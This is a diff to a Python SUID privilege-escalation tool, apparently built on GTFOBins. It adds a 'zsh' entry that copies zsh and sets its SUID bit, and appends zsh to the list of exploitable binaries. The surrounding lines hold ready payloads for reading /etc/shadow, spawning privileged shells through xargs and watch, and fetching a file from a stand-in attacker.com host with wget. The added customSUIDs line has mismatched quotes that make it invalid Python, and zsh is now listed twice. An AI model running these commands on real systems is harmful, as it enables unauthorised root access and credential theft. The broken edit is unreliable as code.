@@ -75,6 +75,7 @@ customSUIDs = {
 	'xz': 'LFILE=file_to_read\n./xz -c "$LFILE" | xz -d',
 	'zip': "TF=$(mktemp -u)\n./zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF", 'wget': 'export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\n./wget $URL -O $LFILE',
 	'zsoelim': 'LFILE=file_to_read\n./zsoelim "$LFILE"',
+	'zsh": "sh -c \'cp \$\(which zsh\) .\; chmod +s ./zsh\'\n',
 }
 
 """
@@ -151,14 +152,14 @@ suidExploitation = {
 	'watch': '-x sh -c \'reset; exec sh 1>&0 2>&0\'',
 	'xargs': '-a /dev/null sh -p',
 	'xxd': '/etc/shadow | xxd -r',
-	'zsh': '',
+	'zsh': 'sh -c \'cp \$\(which zsh\) .\; chmod +s ./zsh\'\n',
 }
 
 """
 The following list contains GTFO Bins binaries which are SUID exploitable
 """
 
-gtfoBinsList	= ['bash', 'busybox', 'cat', 'chroot', 'cut', 'dash', 'docker', 'env', 'expand', 'expect', 'find', 'flock', 'fold', 'gdb', 'grep', 'head', 'ionice', 'jrunscript', 'ksh', 'ld.so', 'less', 'logsave', 'make', 'more', 'nice', 'nl', 'node', 'od', 'perl', 'pg', 'php', 'python', 'rlwrap', 'rpm', 'rpmquery', 'rsync', 'run-parts', 'rvim', 'sed', 'setarch', 'sort', 'start-stop-daemon', 'stdbuf', 'strace', 'tail', 'taskset', 'time', 'timeout', 'ul', 'unexpand', 'uniq', 'unshare', 'vim', 'watch', 'xargs', 'xxd', 'zsh', 'aria2c', 'arp', 'ash', 'base32', 'base64', 'byebug', 'chmod', 'chown', 'cp', 'csh', 'curl', 'date', 'dd', 'dialog', 'diff', 'dmsetup', 'file', 'ed', 'emacs', 'eqn', 'fmt', 'gawk', 'gimp', 'git', 'gtester', 'hd', 'hexdump', 'highlight', 'iconv', 'iftop', 'ip', 'jjs', 'jq', 'ksshell', 'ldconfig', 'look', 'lua', 'lwp-download', 'lwp-request', 'mawk', 'mv', 'mysql', 'awk', 'nano', 'nawk', 'nc', 'nmap', 'nohup', 'openssl', 'pic', 'pico', 'pry', 'readelf', 'restic', 'scp', 'shuf', 'soelim', 'sqlite3', 'socat', 'strings', 'sysctl', 'systemctl', 'tac', 'tar', 'tclsh', 'tee', 'telnet', 'tftp', 'uudecode', 'uuencode', 'xz', 'zip', 'wget', 'zsoelim']
+gtfoBinsList	= ['bash', 'busybox', 'cat', 'chroot', 'cut', 'dash', 'docker', 'env', 'expand', 'expect', 'find', 'flock', 'fold', 'gdb', 'grep', 'head', 'ionice', 'jrunscript', 'ksh', 'ld.so', 'less', 'logsave', 'make', 'more', 'nice', 'nl', 'node', 'od', 'perl', 'pg', 'php', 'python', 'rlwrap', 'rpm', 'rpmquery', 'rsync', 'run-parts', 'rvim', 'sed', 'setarch', 'sort', 'start-stop-daemon', 'stdbuf', 'strace', 'tail', 'taskset', 'time', 'timeout', 'ul', 'unexpand', 'uniq', 'unshare', 'vim', 'watch', 'xargs', 'xxd', 'zsh', 'aria2c', 'arp', 'ash', 'base32', 'base64', 'byebug', 'chmod', 'chown', 'cp', 'csh', 'curl', 'date', 'dd', 'dialog', 'diff', 'dmsetup', 'file', 'ed', 'emacs', 'eqn', 'fmt', 'gawk', 'gimp', 'git', 'gtester', 'hd', 'hexdump', 'highlight', 'iconv', 'iftop', 'ip', 'jjs', 'jq', 'ksshell', 'ldconfig', 'look', 'lua', 'lwp-download', 'lwp-request', 'mawk', 'mv', 'mysql', 'awk', 'nano', 'nawk', 'nc', 'nmap', 'nohup', 'openssl', 'pic', 'pico', 'pry', 'readelf', 'restic', 'scp', 'shuf', 'soelim', 'sqlite3', 'socat', 'strings', 'sysctl', 'systemctl', 'tac', 'tar', 'tclsh', 'tee', 'telnet', 'tftp', 'uudecode', 'uuencode', 'xz', 'zip', 'wget', 'zsoelim', 'zsh']
 
 """
 Colors List
